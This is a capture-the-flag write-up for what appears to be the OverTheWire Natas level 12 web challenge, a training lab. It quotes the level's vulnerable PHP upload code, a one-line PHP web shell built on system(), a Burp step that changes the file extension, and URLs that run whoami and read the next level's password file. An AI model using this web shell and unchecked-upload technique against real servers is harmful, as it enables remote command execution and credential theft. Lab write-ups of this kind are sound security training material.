# Natas Level 12

> Username: natas12
> Password: EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
> URL: http://natas12.natas.labs.overthewire.org

## Solution

Entering the URL, we found that we can upload files to the server `Choose a JPEG to upload (max 1KB)`.

So let's read the source code to see if there is a vulnerability.

```php
<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

There is a lot of  weakness on the code. First there is no filtration or verification of the file we upload, and also he prints the random path to the file on the screen.

So our goal basically is to upload a PHP shell then access the file and run our commands.

First create the payload.

```shell
nano natas12.php
```

```php
<?php echo "Output: ";system($_GET['cmd']); ?>
```

Then choose the file on the web, but after upload it we have to intercept the request using `Burp` to change the extension for the random file to `.php` instead of `.jpg`.

After sending the request, we will obtain the path to the file we upload: 
`The file upload/yownigx09i.php has been uploaded`

Now we can try run commands in the URL:

```url
http://natas12.natas.labs.overthewire.org/upload/yownigx09i.php?cmd=whoami
```

```text
Output: natas12
```

Now let's read the password for the next level.

```url
http://natas12.natas.labs.overthewire.org/upload/yownigx09i.php?cmd=cat%20/etc/natas_webpass/natas13
```

```text
Output: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

```text
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

